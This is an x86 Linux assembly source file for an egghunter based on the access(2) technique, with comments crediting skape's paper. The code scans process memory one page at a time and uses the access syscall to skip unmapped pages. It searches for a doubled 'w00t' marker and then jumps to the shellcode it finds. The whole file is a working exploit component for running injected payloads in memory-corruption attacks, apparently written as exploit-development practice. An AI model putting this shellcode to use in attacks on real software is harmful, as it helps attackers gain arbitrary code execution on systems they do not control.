; Info about egghunters:
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; code based on access(2) revisited egghunter


global _start

section .text

_start:
    xor edx, edx ; XOR out EDX, this will contain the target address for access and egg evaluation
incr_page:
    ; will always reset to xFFFF and gets incremeted in the next step
    or dx, 0xfff ; 4095, one less than the PAGE_SIZE - 
    ; if stating from here, increasing edx means a PAGE_SIZE increment - 0xzfff becomes 0x(z+1)000
incr_addr:
    inc edx ; next address
    lea ebx, [edx+0x4] ; load edx+4
    
    ;http://man7.org/linux/man-pages/man2/access.2.html
    push byte +0x21 ; access syscall
    pop eax ; access syscall
    int 0x80 ;

    cmp al,0xf2 ; 0xf2 - EFAULT aka invalid memory address (outside accessible address space)
    jz short incr_page ; invalid memory address, we can go a PAGE_SIZE up
    mov eax, 0x74303077 ; w00t
    mov edi, edx ; 
    scasd ; search for the first instance of EAX (w00t) in EDI
    jnz short incr_addr
    scasd ; search for the second instance EAX (w00t) in EDI
    jnz short incr_addr
    jmp edi ; execute shellcode